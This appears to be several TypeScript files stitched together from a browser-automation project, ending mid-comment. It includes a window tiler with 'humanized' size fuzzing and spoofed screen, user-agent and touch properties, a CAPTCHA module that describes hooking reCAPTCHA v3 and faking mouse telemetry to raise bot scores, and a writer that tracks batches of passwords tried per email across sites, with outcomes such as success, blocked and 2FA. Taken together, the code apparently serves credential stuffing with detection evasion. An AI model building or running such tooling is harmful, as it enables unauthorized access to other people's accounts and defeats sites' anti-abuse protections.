/**
 * Universal Browser Tiler
 * 
 * Manages slots and mathematically calculates screen bounds for headed browser windows.
 * Can be imported by any automation backend to ensure consistent window packing.
 */
export class BrowserTiler {
  private totalWindows: number;
  private freeSlots: number[];
  private customGrid: {cols: number, rows: number} | null = null;
  private waiters: Array<(n: number) => void> = [];
  constructor(initialWindows: number = 1) {
    this.totalWindows = initialWindows;
    this.freeSlots = Array.from({ length: this.totalWindows }, (_, i) => i);
  }
  public getTotalWindows(): number {
    return this.totalWindows;
  }
  /**
   * Adjusts the total number of managed windows dynamically.
   * New slots are appended, while out-of-bounds slots are discarded.
   */
  public reconfigure(concurrency: number, customGrid?: {cols: number, rows: number}): void {
    if (customGrid) {
      this.customGrid = customGrid;
      concurrency = customGrid.cols * customGrid.rows;
    } else {
      this.customGrid = null;
    }
    if (concurrency > this.totalWindows) {
      for (let i = this.totalWindows; i < concurrency; i++) {
        this.freeSlots.push(i);
      }
      this.totalWindows = concurrency;
    } else if (concurrency < this.totalWindows) {
      this.totalWindows = concurrency;
      this.freeSlots = this.freeSlots.filter(slot => slot < this.totalWindows);
    }
  }
  /**
   * Acquires the next available slot number. Wait if none are available.
   */
  public async acquireSlot(): Promise<number> {
    if (this.freeSlots.length > 0) {
      return this.freeSlots.shift()!;
    }
    return new Promise<number>((resolve) => this.waiters.push(resolve));
  }
  /**
   * Releases a slot back into the available pool.
   */
  public releaseSlot(slot: number): void {
    if (this.waiters.length > 0) {
      const nextWaiter = this.waiters.shift()!;
      nextWaiter(slot);
    } else {
      this.freeSlots.push(slot);
    }
  }
  /**
   * Calculates dynamic (x, y, width, height) to pack windows evenly based on the current pool size.
   */
  public async getBounds(slot: number): Promise<ScreenBounds & { zOrder?: string, _emulateDpr?: number, _emulateMobile?: boolean } | null> {
    const config = ConfigStore.load();
    if (config.tilingLayout === "os-native") {
      return null;
    }

    const monitors = windowManager.getMonitors();
    if (monitors.length === 0) return null;

    // Distribute slots across multiple monitors
    const windowsPerMonitor = Math.ceil(this.totalWindows / monitors.length);
    const monitorIndex = Math.min(Math.floor(slot / windowsPerMonitor), monitors.length - 1);
    const localSlot = slot % windowsPerMonitor;
    const monitor = monitors[monitorIndex];
    if (!monitor) return null;

    // Improvement 3: Dynamic Taskbar Compensation
    // node-window-manager returns the raw resolution. We reserve the bottom 48px to emulate SPI_GETWORKAREA
    const TASKBAR_HEIGHT = 48;
    const rawScreen = monitor.getBounds();
    const screen = {
       x: rawScreen?.x ?? 0,
       y: rawScreen?.y ?? 0,
       width: rawScreen?.width ?? 1920,
       height: Math.max(10, (rawScreen?.height ?? 1080) - TASKBAR_HEIGHT)
    };

    if (this.totalWindows <= 1) {
      return { x: screen.x, y: screen.y, width: screen.width, height: screen.height };
    }

    const TILE_GAP = 6;

    // cols and rows will be calculated based on grid mode below

    // "cascading" or "messy desk" layout mode
    if (config.tilingLayout === "cascading") {
       let baseWidth = Math.floor(screen.width * 0.7);
       let baseHeight = Math.floor(screen.height * 0.7);

       // 50/50 Aspect Ratio Spin for Portrait
       if (Math.random() > 0.5) {
           const temp = baseWidth;
           baseWidth = Math.min(screen.width * 0.9, baseHeight);
           baseHeight = Math.min(screen.height * 0.9, temp);
       }

       const offsetX = (localSlot * 40) % Math.max(1, screen.width - baseWidth);
       const offsetY = (localSlot * 40) % Math.max(1, screen.height - baseHeight);

       const fuzzW = Math.floor(Math.random() * 20);
       const fuzzH = Math.floor(Math.random() * 20);

       const x = screen.x + offsetX;
       const y = screen.y + offsetY;
       const width = baseWidth + fuzzW;
       const height = baseHeight + fuzzH;

       const zOrder = Math.random() > 0.5 ? "TOP" : "BOTTOM";
       return { x, y, width, height, zOrder };
    }

    // Improvement 2 & 4: Chaos Mode (Top 100 Viewport Snapping)
    if (config.tilingLayout === "chaos") {
        try {
            const topViewportsPath = path.join(process.cwd(), 'data', 'top-viewports.json');
            if (fs.existsSync(topViewportsPath)) {
                const viewports = JSON.parse(fs.readFileSync(topViewportsPath, 'utf8')) as Array<{width: number; height: number; isMobile?: boolean; dpr?: number}>;
                const randomVp = viewports[Math.floor(Math.random() * viewports.length)];
                if (!randomVp) throw new Error("No viewports found in top-viewports.json");

                // Allow random flipping of orientation for tablets, but phones usually stay portrait
                let width = randomVp.width;
                let height = randomVp.height;
                if (!randomVp.isMobile && Math.random() > 0.5) {
                    width = randomVp.height;
                    height = randomVp.width;
                }

                // Ensure it fits on screen
                width = Math.min(width, screen.width - 20);
                height = Math.min(height, screen.height - 20);

                const x = screen.x + Math.floor(Math.random() * Math.max(1, screen.width - width));
                const y = screen.y + Math.floor(Math.random() * Math.max(1, screen.height - height));
                const zOrder = Math.random() > 0.5 ? "TOP" : "BOTTOM";

                // We pass dpr and isMobile back for the dynamic CDP swapping
                return { x, y, width, height, zOrder, _emulateDpr: randomVp.dpr, _emulateMobile: randomVp.isMobile };
            }
        } catch(e) {
            log.error(`Failed to load top-viewports.json: ${e instanceof Error ? e.message : String(e)}`);
        }

        // Fallback chaos mode
        const MIN_WIDTH = 320;
        const MIN_HEIGHT = 240;
        const maxWidth = Math.max(MIN_WIDTH + 1, Math.floor(screen.width * 0.8));
        const maxHeight = Math.max(MIN_HEIGHT + 1, Math.floor(screen.height * 0.8));

        let width = Math.floor(Math.random() * (maxWidth - MIN_WIDTH)) + MIN_WIDTH;
        let height = Math.floor(Math.random() * (maxHeight - MIN_HEIGHT)) + MIN_HEIGHT;

        if (Math.random() > 0.5 && width > height) {
           const temp = width;
           width = height;
           height = temp;
        }

        const x = screen.x + Math.floor(Math.random() * Math.max(1, screen.width - width));
        const y = screen.y + Math.floor(Math.random() * Math.max(1, screen.height - height));

        const zOrder = Math.random() > 0.5 ? "TOP" : "BOTTOM";
        return { x, y, width, height, zOrder };
    }

    // Improvement 1: Golden Ratio (Fibonacci) Splitting
    if (config.tilingLayout === "fibonacci") {
        let remainingWidth = screen.width;
        let remainingHeight = screen.height;
        let x = screen.x;
        let y = screen.y;

        for (let i = 0; i < localSlot; i++) {
            if (i % 2 === 0) {
                const chunk = Math.floor(remainingWidth * 0.618);
                x += chunk;
                remainingWidth -= chunk;
            } else {
                const chunk = Math.floor(remainingHeight * 0.618);
                y += chunk;
                remainingHeight -= chunk;
            }
        }

        let width = (localSlot % 2 === 0) ? Math.floor(remainingWidth * 0.618) : remainingWidth;
        let height = (localSlot % 2 === 1) ? Math.floor(remainingHeight * 0.618) : remainingHeight;

        if (localSlot === windowsPerMonitor - 1) {
            width = remainingWidth;
            height = remainingHeight;
        }

        // Apply natural human fuzzing to the fibonacci blocks
        width += (Math.random() > 0.5 ? 1 : -1) * (Math.floor(Math.random() * 4) + 1);
        height += (Math.random() > 0.5 ? 1 : -1) * (Math.floor(Math.random() * 4) + 1);

        return { x, y, width, height };
    }

    // OS-Native "Snap Layout" Fuzzing
    if (config.tilingLayout === "snap") {
        const snapWidth = Math.floor(screen.width / 2);
        const isLeft = (localSlot % 2) === 0;

        // Exact snap math +/- 1px variance
        const fuzzW = (Math.random() > 0.5 ? 1 : -1);
        const fuzzH = (Math.random() > 0.5 ? 1 : -1);

        const width = snapWidth + fuzzW;
        const height = screen.height + fuzzH;
        const x = screen.x + (isLeft ? 0 : snapWidth) + (Math.random() > 0.5 ? 1 : -1);
        const y = screen.y + (Math.random() > 0.5 ? 1 : -1);
        return { x, y, width, height };
    }

    if (this.customGrid) {
      cols = this.customGrid.cols;
      rows = this.customGrid.rows;
    } else if (config.tilingLayout === "portrait-grid" || config.tilingLayout === "horizontal") {
      cols = windowsPerMonitor;
      rows = 1;
    } else if (config.tilingLayout === "vertical") {
      cols = 1;
      rows = windowsPerMonitor;
    } else {
      // "auto" mode: Aspect-Aware Smart Grid
      if (screen.width > screen.height) {
         // Landscape monitor: Favor columns to push viewports into portrait ratio
         rows = Math.max(1, Math.floor(Math.sqrt(windowsPerMonitor)));
         cols = Math.ceil(windowsPerMonitor / rows);
      } else {
         // Portrait monitor: Favor rows
         cols = Math.max(1, Math.floor(Math.sqrt(windowsPerMonitor)));
         rows = Math.ceil(windowsPerMonitor / cols);
      }
    }

    const cellW = Math.floor(screen.width / cols);
    const cellH = Math.floor(screen.height / rows);

    const col = localSlot % cols;
    const row = Math.floor(localSlot / cols);

    const xBase = screen.x + col * cellW + TILE_GAP;
    const yBase = screen.y + row * cellH + TILE_GAP;
    const widthBase = Math.max(320, cellW - TILE_GAP * 2);
    const heightBase = Math.max(240, cellH - TILE_GAP * 2);

    // Humanized Dynamic Viewports: Micro-fuzzing (1 to 4 pixels)
    const fuzzW = Math.floor(Math.random() * 4) + 1;
    const fuzzH = Math.floor(Math.random() * 4) + 1;

    const offsetX = Math.floor(Math.random() * 4) + 1;
    const offsetY = Math.floor(Math.random() * 4) + 1;

    let width = widthBase - fuzzW;
    let height = heightBase - fuzzH;
    let x = xBase + offsetX;
    let y = yBase + offsetY;

    // Feature 3: Inner Viewport Minimum Constraints
    // Lowered to 320x240 to support true Portrait mode side-by-side!
    const MIN_WIDTH = 320;
    const MIN_HEIGHT = 240;

    if (width < MIN_WIDTH) {
       width = MIN_WIDTH;
       // Diagonal Z-Stacking Overlap Logic: Offset by slot index so top-left is always visible
       x = Math.max(screen.x, Math.min(screen.x + screen.width - width, x + (localSlot * 20)));
    }
    if (height < MIN_HEIGHT) {
       height = MIN_HEIGHT;
       y = Math.max(screen.y, Math.min(screen.y + screen.height - height, y + (localSlot * 20)));
    }

    return { x, y, width, height };
  }

  // Global lock to prevent concurrent PowerShell resize hooks from deadlocking Camoufox during launch

  /**
   * Enforces the OS window bounds natively.
   * @param backendName - The backend identifier (e.g., "stealth", "cloak-headed").
   *   Used to skip Chromium-only CDP commands and JS fingerprint overrides
   *   that conflict with Camoufox's C++ engine-level management (Rule 39).
   */
  public async enforceWindowBounds(page: Page, bounds: ScreenBounds & { zOrder?: string, _emulateDpr?: number, _emulateMobile?: boolean } | null, _browserPid?: number, backendName?: string): Promise<void> {
    return Promise.race([
      this._enforceWindowBounds(page, bounds, _browserPid, backendName),
      new Promise<void>((_, rej) => setTimeout(() => rej(new Error("BrowserTiler bounds enforcement timed out")), 5000))
    ]).catch(e => {
      log.warn(`[BrowserTiler] Bounds enforcement failed or timed out: ${e instanceof Error ? e.message : String(e)}`);
    });
  }

  private async _enforceWindowBounds(page: Page, bounds: ScreenBounds & { zOrder?: string, _emulateDpr?: number, _emulateMobile?: boolean } | null, _browserPid?: number, backendName?: string): Promise<void> {
    if (!bounds) return; // OS-native mode bypasses bounds entirely

    const isStealth = backendName?.startsWith("stealth") ?? false;

    try {
      // 1. Native OS Manipulation via C# Executable (Flawless Windows API Hook with <10ms overhead)
      if (process.platform === "win32") {
      try {
        if (!page) throw new Error("Page required for title injection");

        const uniqueTitle = "Automati_Tiling_" + Date.now() + "_" + Math.floor(Math.random() * 10000);
        log.info(`Injecting title for ${isStealth ? 'Firefox/Camoufox' : 'Chromium'} hook: ${uniqueTitle}`);
        await page.evaluate((newTitle: string) => {
          // eslint-disable-next-line @typescript-eslint/no-explicit-any -- browser-side window API
          (window as any).__originalTitle = document.title;
          document.title = newTitle;
        }, uniqueTitle).catch(() => {});

        // Wait for OS to register the new title via a page round-trip
        // (deterministic: waits for Playwright evaluate to resolve rather than an arbitrary sleep)
        await page.evaluate(() => document.title).catch(() => {});

        const zOrder = bounds.zOrder ?? "TOP";
        const resizerExe = path.join(process.cwd(), "resizer.exe");

        let nativeTilingSuccess = false;

        if (fs.existsSync(resizerExe)) {
          const out = execFileSync(resizerExe, [
             uniqueTitle, 
             Math.floor(bounds.x).toString(), 
             Math.floor(bounds.y).toString(), 
             Math.floor(bounds.width).toString(), 
             Math.floor(bounds.height).toString(), 
             zOrder
          ], { encoding: "utf8" });

          log.info(`C# Native hook result: ${out.trim()}`);
          nativeTilingSuccess = out.includes("SUCCESS");
        } else {
           log.warn(`Native C# resizer.exe not found at ${resizerExe}`);
        }

        // ── node-window-manager fallback (Issue 8 — Firefox/Camoufox tiling fix) ──
        // If resizer.exe failed or doesn't exist, use the already-imported
        // node-window-manager to find the window by its injected title and
        // call setBounds directly. This is the ONLY reliable method for
        // Firefox/Camoufox since:
        //   - CDP Browser.getWindowForTarget is Chromium-only
        //   - window.moveTo/resizeTo is blocked by dom.disable_window_move_resize
        // Works for Chromium too as a universal fallback.
        if (!nativeTilingSuccess) {
          try {
            const allWindows = windowManager.getWindows();
            const target = allWindows.find((w: { getTitle: () => string; setBounds: (b: {x: number; y: number; width: number; height: number}) => void }) => {
              try { return w.getTitle().includes(uniqueTitle); } catch { return false; }
            });
            if (target) {
              target.setBounds({
                x: Math.floor(bounds.x),
                y: Math.floor(bounds.y),
                width: Math.floor(bounds.width),
                height: Math.floor(bounds.height),
              });
              log.info(`node-window-manager setBounds SUCCESS for "${uniqueTitle}" → ${bounds.width}x${bounds.height} @ (${bounds.x},${bounds.y})`);
              nativeTilingSuccess = true;
            } else {
              log.warn(`node-window-manager: No window found matching title "${uniqueTitle}" (${allWindows.length} windows scanned)`);
            }
          } catch (nwmErr: unknown) {
            log.warn(`node-window-manager fallback failed: ${nwmErr instanceof Error ? nwmErr.message : String(nwmErr)}`);
          }
        }

        // Restore title
        await page.evaluate(() => {
          if (typeof (window as any).__originalTitle !== 'undefined') {
            document.title = (window as any).__originalTitle;
          }
        }).catch(() => {});

        if (nativeTilingSuccess) {
            // ── Post-tiling viewport enhancements (Chromium-only) ──
            // These CDP + addInitScript overrides are SKIPPED for stealth (Camoufox)
            // because Camoufox manages window.screen, outerWidth, outerHeight at the
            // C++ engine level. Layering JS overrides creates Frankenstein profiles
            // (Rule 39: strict-no-frankenstein-fingerprints).
            if (!isStealth) {
              try {
                if (page.context) {
                   const context = page.context();
                   const cdp = await context.newCDPSession(page).catch(() => null);
                   if (cdp) {
                     // Anti-Breakage CSS, Orientation Change, Scrollbar Randomization & Screen Property Fuzzing
                     await page.addInitScript((injectedBounds: ScreenBounds & { _emulateMobile?: boolean } | null) => {
                       const style = document.createElement('style');
                       const scrollbarWidth = Math.floor(Math.random() * 8) + 8; // 8px to 16px

                       style.innerHTML = `
                           body, html { min-width: 100vw !important; max-width: 100vw !important; overflow-x: hidden !important; }
                           ::-webkit-scrollbar { width: ${scrollbarWidth}px !important; }
                       `;
                       document.addEventListener('DOMContentLoaded', () => document.head.appendChild(style));

                       let lastWidth = window.innerWidth;
                       window.addEventListener('resize', () => {
                          if ((lastWidth < window.innerHeight && window.innerWidth > window.innerHeight) || 
                              (lastWidth > window.innerHeight && window.innerWidth < window.innerHeight)) {
                              window.dispatchEvent(new Event('orientationchange'));
                          }
                          lastWidth = window.innerWidth;
                       });

                       // Screen Property Fuzzing — ONLY for explicit mobile emulation
                       // For regular grid tiling, the real monitor screen dimensions MUST be
                       // preserved. Setting screen.width to a 370px tile cell creates a
                       // Frankenstein profile (desktop Chrome UA + mobile screen.width = bot flag).
                       if (injectedBounds && injectedBounds._emulateMobile) {
                           const fuzzedScreen = {
                               width: injectedBounds.width,
                               height: injectedBounds.height,
                               availWidth: injectedBounds.width,
                               availHeight: injectedBounds.height,
                               colorDepth: 24,
                               pixelDepth: 24,
                               orientation: { type: injectedBounds.width > injectedBounds.height ? "landscape-primary" : "portrait-primary", angle: 0 }
                           };

                           Object.defineProperty(window, 'screen', {
                               get: () => fuzzedScreen
                           });

                           // Mask outer dimensions to match inner when mimicking mobile
                           Object.defineProperty(window, 'outerWidth', { get: () => window.innerWidth });
                           Object.defineProperty(window, 'outerHeight', { get: () => window.innerHeight });
                       }
                     }, bounds).catch(() => {});

                     // Dynamic Mobile / Touch Emulation (Chromium CDP only)
                     // ONLY when explicitly requested by chaos/viewport layout — NEVER auto-detect from width
                     // Auto-detection at width < 600 was corrupting all headed audits (grid cells are ~370px)
                     if (bounds._emulateMobile) {
                         log.info(`Explicit mobile emulation requested for bounds ${bounds.width}px. Enabling Touch & UA.`);
                         await cdp.send('Emulation.setDeviceMetricsOverride', {
                             width: 0, // 0 = inherit from OS window
                             height: 0,
                             deviceScaleFactor: bounds._emulateDpr || 2.5,
                             mobile: true
                         }).catch(() => {});

                         await cdp.send('Emulation.setTouchEmulationEnabled', {
                             enabled: true,
                             maxTouchPoints: 5
                         }).catch(() => {});

                         await cdp.send('Network.setUserAgentOverride', {
                             userAgent: 'Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36',
                             platform: 'Android'
                         }).catch(() => {});
                     }
                   }
                }
              } catch (e) {
                log.debug(`Failed to inject CDP Viewport Emulation: ${String(e)}`);
              }
            } else {
              log.info(`Skipping CDP/screen overrides for stealth backend (Camoufox manages these natively)`);
            }
            return; // Successfully tiled
          }
      } catch (e) {
        log.warn(`Native tiling hook failed, falling back to CDP/JS: ${e instanceof Error ? e.message : String(e)}`);
      }
    }

    // 2. Chromium CDP Fallback (skipped for Firefox/Juggler — not implemented)
    if (!isStealth) {
      try {
        const client = await page.context().newCDPSession(page);
        const { windowId } = await client.send('Browser.getWindowForTarget');
        await client.send('Browser.setWindowBounds', {
          windowId,
          bounds: {
            left: bounds.x,
            top: bounds.y,
            width: bounds.width,
            height: bounds.height,
            windowState: 'normal'
          }
        });
        client.detach().catch(() => {});
        return;
      } catch (e) {
        // Falls through to JS fallback
      }
    }

    // 3. Firefox/JS Fallback — window.moveTo/resizeTo
    // NOTE: For Camoufox, this only works if firefoxUserPrefs has
    // 'dom.disable_window_move_resize': false (set in stealth.ts).
    try {
      await page.evaluate((b: {x: number, y: number, w: number, h: number}) => {
        window.moveTo(b.x, b.y);
        window.resizeTo(b.w, b.h);
      }, {x: bounds.x, y: bounds.y, w: bounds.width, h: bounds.height}).catch(() => {});
    } catch (fallbackErr) {
      log.warn(`Failed to enforce window bounds via all methods: ${fallbackErr instanceof Error ? fallbackErr.message : String(fallbackErr)}`);
    }
    } finally {
      // Empty, no longer need Mutex!
    }
  }
}
// Export a universal global instance
export const globalTiler = new BrowserTiler(1);

export function disableBookmarksBar(userDataDir: string): void {
  try {
    const defaultDir = path.join(userDataDir, "Default");
    if (!fs.existsSync(defaultDir)) fs.mkdirSync(defaultDir, { recursive: true });
    const prefsPath = path.join(defaultDir, "Preferences");
    let prefs: { bookmark_bar?: { show_on_all_tabs?: boolean }; [key: string]: unknown } = {};
    if (fs.existsSync(prefsPath)) {
      prefs = JSON.parse(fs.readFileSync(prefsPath, 'utf8')) as { bookmark_bar?: { show_on_all_tabs?: boolean }; [key: string]: unknown };
    }
    prefs.bookmark_bar = { show_on_all_tabs: false };
    fs.writeFileSync(prefsPath, JSON.stringify(prefs));
  } catch (e) {
    log.warn(`Failed to disable bookmarks bar via Preferences: ${e instanceof Error ? e.message : String(e)}`);
  }
}

/* eslint-disable @typescript-eslint/no-explicit-any, @typescript-eslint/no-unsafe-assignment, @typescript-eslint/no-unsafe-member-access, @typescript-eslint/no-unsafe-call, @typescript-eslint/no-unsafe-argument, @typescript-eslint/no-unsafe-return, @typescript-eslint/no-unused-expressions, @typescript-eslint/no-unused-vars, @typescript-eslint/require-await */
import { Page } from "playwright-core";
import { createLogger } from "../core/logger.js";

const log = createLogger("CAPTCHA");

/**
 * CAPTCHA Detection & Handling
 *
 * Target sites use INVISIBLE reCAPTCHA v3 (score-based, 0.0–1.0).
 * There are NO puzzle CAPTCHAs to solve. Score maximization is handled
 * by the stealth scripts layer (recaptcha-interceptor.ts):
 *   - grecaptcha.execute hook with minimum 3s delay
 *   - Bézier mouse trajectory behavioral emulation
 *   - Continuous RAF-driven micro-events for telemetry
 *   - ___grecaptcha_cfg callback override
 *
 * This module provides detection utilities for identifying CAPTCHA
 * types present on a page, and routes to the appropriate handler
 * if a visual CAPTCHA is ever encountered (future-proofing).
 */

/**
 * Detect what type of CAPTCHA (if any) is present on the page.
 * Returns the CAPTCHA type or null if none detected.
 */
export async function detectCaptchaType(page: Page): Promise<
  "recaptcha-v3" | "recaptcha-v2" | "turnstile" | "hcaptcha" | null
> {
  try {
    return await page.evaluate(() => {
      // reCAPTCHA v3 (invisible — score-based, no puzzle)
      if (
        typeof (window as any).grecaptcha !== "undefined" ||
        document.querySelector('script[src*="recaptcha/api.js"]') ||
        document.querySelector('script[src*="recaptcha/enterprise.js"]')
      ) {
        // Check if it's v2 (has visible badge/checkbox) or v3 (invisible)
        const v2Frame = document.querySelector('iframe[src*="recaptcha"][src*="anchor"]');
        const v2Checkbox = document.querySelector('.g-recaptcha[data-sitekey]');
        if (v2Frame || v2Checkbox) return "recaptcha-v2" as const;
        return "recaptcha-v3" as const;
      }

      // Cloudflare Turnstile
      if (document.querySelector('iframe[src*="challenges.cloudflare.com"]')) {
        return "turnstile" as const;
      }

      // hCaptcha
      if (document.querySelector('iframe[src*="hcaptcha"]')) {
        return "hcaptcha" as const;
      }

      return null;
    });
  } catch {
    return null;
  }
}

/**
 * Check if the page has reCAPTCHA v3 (score-based, no puzzle).
 * This is the expected CAPTCHA type on target sites.
 */
export async function isReCaptchaV3Only(page: Page): Promise<boolean> {
  const type = await detectCaptchaType(page);
  return type === "recaptcha-v3";
}

/**
 * Main CAPTCHA handler entry point.
 *
 * For reCAPTCHA v3: Logs detection and confirms score-based handling
 * is active via stealth scripts. No puzzle solving needed.
 *
 * For visual CAPTCHAs (v2, Turnstile, hCaptcha): Logs a warning.
 * These are NOT expected on target sites. If encountered, it likely
 * indicates a detection failure that should be investigated.
 */
export async function detectAndSolveCaptcha(page: Page, _apiKey?: string): Promise<boolean> {
  const captchaType = await detectCaptchaType(page);

  if (!captchaType) return false;

  if (captchaType === "recaptcha-v3") {
    log.info("reCAPTCHA v3 detected — score-based, handled by stealth scripts layer");
    return false; // No action needed — stealth scripts handle scoring
  }

  // Visual CAPTCHA detected — this is unexpected on target sites
  log.warn(
    `Visual CAPTCHA detected: ${captchaType}. ` +
    `This is NOT expected on target sites. ` +
    `Possible detection failure — investigate fingerprint coherence.`
  );

  // Log for detection feedback loop
  log.error(
    `[DETECTION EVENT] vector=visual_captcha_${captchaType} ` +
    `reason="Unexpected visual CAPTCHA appeared — possible fingerprint detection"`
  );

  return false;
}

/**
 * Standalone zombie cleaner.
 *
 *   npm run clean:zombies            # cleans all orphan Chromium PIDs we own
 *   npx tsx clean-zombies.ts --dry   # report only, no kills
 *
 * "Ours" = Chromium / CloakBrowser processes whose --user-data-dir lands
 * inside the configured cloak-profile root, $TMPDIR/cloak-profiles, or the
 * repo root. The normal user Chrome is never targeted.
 */
import { findOurOrphans, killOurOrphans } from "./process-cleaner.js";

async function main(): Promise<void> {
  const dryRun = process.argv.slice(2).includes("--dry");
  const found = await findOurOrphans({ minEtimeSec: 0 });
  if (found.length === 0) {
    console.log("[clean-zombies] no orphan Chromium PIDs found");
    return;
  }
  console.log(`[clean-zombies] found ${found.length} orphan PID(s):`);
  for (const f of found) {
    const preview = f.cmd.length > 140 ? f.cmd.slice(0, 137) + "..." : f.cmd;
    console.log(`  pid=${f.pid} etime=${f.etimeSec}s ${preview}`);
  }
  if (dryRun) {
    console.log("[clean-zombies] --dry specified; not killing");
    return;
  }
  const r = await killOurOrphans({ timeoutMs: 5000, minEtimeSec: 0 });
  console.log(`[clean-zombies] killed=${r.killed} survived=${r.survived}`);
  if (r.survived > 0) process.exitCode = 1;
}

main().then(() => process.exit(process.exitCode ?? 0)).catch((err) => {
  console.error("[clean-zombies] failed:", err?.message || err);
  process.exit(1);
});

/* eslint-disable @typescript-eslint/no-explicit-any, @typescript-eslint/no-unsafe-assignment, @typescript-eslint/no-unsafe-member-access, @typescript-eslint/no-unsafe-call, @typescript-eslint/no-unsafe-argument, @typescript-eslint/no-unsafe-return, @typescript-eslint/no-unused-expressions, @typescript-eslint/no-unused-vars, @typescript-eslint/require-await */
/**
 * credential-xlsx-writer.ts
 * 
 * Creates and maintains a color-coded XLSX version of credentials.csv
 * that updates in real-time as test results come in.
 * 
 * Color scheme:
 *   ✓ Green   (#22C55E) — correct password / success
 *   ✗ Red     (#EF4444) — incorrect password
 *   ⏸ Orange  (#F97316) — temporarily disabled
 *   🚫 Dark Red (#B91C1C) — permanently disabled
 *   🛡 Purple  (#8B5CF6) — blocked
 *   🔐 Yellow  (#EAB308) — 2FA required
 *   👻 Gray    (#6B7280) — no account
 *   ⏳ Blue    (#3B82F6) — testing/in-progress
 *   📋 None    — queued (no fill)
 */

import ExcelJS from "exceljs";
import { createLogger } from "../core/logger.js";

const log = createLogger("XlsxWriter");

// ═══ Types ═══
interface PasswordResult {
  password: string;
  outcome: string;       // "success" | "incorrect" | "tempdisabled" | "permdisabled" | "blocked" | "2FA" | "noaccount" | "testing" | "queued" | "N/A"
  site: string;
  timestamp?: string;
  batchIndex?: number;
  attemptIndex?: number; // which attempt within the batch (0-2)
}

interface CredentialXlsxRow {
  email: string;
  passwords: string[];
  passwordResults: PasswordResult[];
  overallOutcome: string;
  sites: { [name: string]: { outcome: string; attempts: number; timestamp?: string } };
  currentBatch: number;
}

// ═══ Color Definitions ═══
const OUTCOME_COLORS: { [key: string]: { bg: string; font: string } } = {
  success:      { bg: "FF22C55E", font: "FF000000" },  // Green
  incorrect:    { bg: "FFEF4444", font: "FFFFFFFF" },  // Red
  tempdisabled: { bg: "FFF97316", font: "FF000000" },  // Orange
  permdisabled: { bg: "FFB91C1C", font: "FFFFFFFF" },  // Dark Red
  blocked:      { bg: "FF8B5CF6", font: "FFFFFFFF" },  // Purple
  "2FA":        { bg: "FFEAB308", font: "FF000000" },  // Yellow
  noaccount:    { bg: "FF6B7280", font: "FFFFFFFF" },  // Gray
  testing:      { bg: "FF3B82F6", font: "FFFFFFFF" },  // Blue
  failed:       { bg: "FFEF4444", font: "FFFFFFFF" },  // Red
  "N/A":        { bg: "FF4B5563", font: "FFFFFFFF" },  // Dark Gray
};

const _HEADER_FILL: ExcelJS.Fill = {
  type: "pattern",
  pattern: "solid",
  fgColor: { argb: "FF111827" },
};

const _HEADER_FONT: Partial<ExcelJS.Font> = {
  bold: true,
  color: { argb: "FF06B6D4" },
  size: 11,
  name: "Calibri",
};

// ═══ Debounce write ═══
let _writeTimeout: ReturnType<typeof setTimeout> | null = null;
let _pendingData: CredentialXlsxRow[] | null = null;
let _xlsxPath: string = "";
let _csvPath: string = "";

const DEBOUNCE_MS = 2000; // 2 second debounce

function _getCellFill(outcome: string): ExcelJS.Fill | undefined {
  const c = OUTCOME_COLORS[outcome];
  if (!c) return undefined;
  return {
    type: "pattern",
    pattern: "solid",
    fgColor: { argb: c.bg },
  };
}

function _getCellFont(outcome: string): Partial<ExcelJS.Font> {
  const c = OUTCOME_COLORS[outcome];
  return {
    color: { argb: c?.font || "FFFFFFFF" },
    size: 10,
    name: "Calibri",
  };
}

/**
 * Determine the outcome for a specific password index based on
 * batch tracking and site results.
 */
function _getPasswordOutcome(
  passwordIdx: number,
  passwords: string[],
  sites: { [name: string]: { outcome: string; attempts: number } },
  currentBatch: number,
  passwordResults: PasswordResult[]
): string {
  // Check if there's a direct result stored for this password
  const directResult = passwordResults.find(r => r.attemptIndex === passwordIdx);
  if (directResult) return directResult.outcome;

  const pw = passwords[passwordIdx];
  if (!pw || pw.length === 0) return "";

  // Determine which batch this password belongs to
  const batchOfPw = Math.floor(passwordIdx / 3);

  // If this batch hasn't been reached yet, it's queued
  if (batchOfPw > currentBatch) return "queued";

  // If this batch is the current one being tested
  if (batchOfPw === currentBatch) {
    // Check site outcomes
    const outcomes = Object.values(sites).map(s => s.outcome);
    if (outcomes.includes("success")) {
      // Success — we don't know which exact pw was the winner in the batch
      // but we mark the batch's passwords accordingly
      return "success";
    }
    if (outcomes.includes("testing")) return "testing";
    if (outcomes.includes("tempdisabled")) return "tempdisabled";
    if (outcomes.includes("permdisabled")) return "permdisabled";
    if (outcomes.includes("blocked")) return "blocked";
    if (outcomes.includes("2FA")) return "2FA";
    if (outcomes.includes("noaccount")) return "noaccount";
    if (outcomes.some(o => o === "N/A" || o === "failed")) return "incorrect";
    if (outcomes.includes("queued")) return "queued";
    return "incorrect";
  }

  // This batch has already been tried (batchOfPw < currentBatch)
  // If we got to a later batch, the earlier ones were incorrect/tempdisabled
  const siteOutcomes = Object.values(sites).map(s => s.outcome);
  if (siteOutcomes.includes("tempdisabled")) return "tempdisabled";
  return "incorrect";
}

/**
 * Write the color-coded XLSX file.
 */
import { Worker } from "worker_threads";
import path from "path";
import { fileURLToPath } from "url";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

async function writeXlsx(rows: CredentialXlsxRow[], outputPath: string, csvPath: string): Promise<void> {
  return new Promise((resolve, reject) => {
    // Resolve the worker file based on whether we are running TS (ts-node) or JS (compiled)
    const ext = __filename.endsWith(".ts") ? ".ts" : ".js";
    const workerPath = path.join(__dirname, `xlsx-worker-thread${ext}`);

    // In ts-node, we might need to pass execArgv to support TS
    const workerOptions: any = {};
    if (ext === ".ts") {
      workerOptions.execArgv = ["--loader", "ts-node/esm"];
    }

    const worker = new Worker(workerPath, workerOptions);

    worker.on("message", (msg) => {
      if (msg.status === "done") {
        resolve();
        void worker.terminate();
      } else if (msg.status === "error") {
        reject(new Error(msg.message));
        void worker.terminate();
      }
    });

    worker.on("error", (err) => {
      reject(err);
      void worker.terminate();
    });

    worker.on("exit", (code) => {
      if (code !== 0) {
        reject(new Error(`Worker stopped with exit code ${code}`));
      }
    });

    worker.postMessage({ rows, outputPath, csvPath });
  });
}

// ═══ Public API ═══

/**
 * Initialize the XLSX writer with paths.
 */
export function initXlsxWriter(csvPath: string, xlsxPath?: string): void {
  _csvPath = csvPath;
  _xlsxPath = xlsxPath || csvPath.replace(/\.csv$/i, "-results.xlsx");
  log.info(`Output: ${_xlsxPath}`);
}

/**
 * Queue a write of the current credential state.
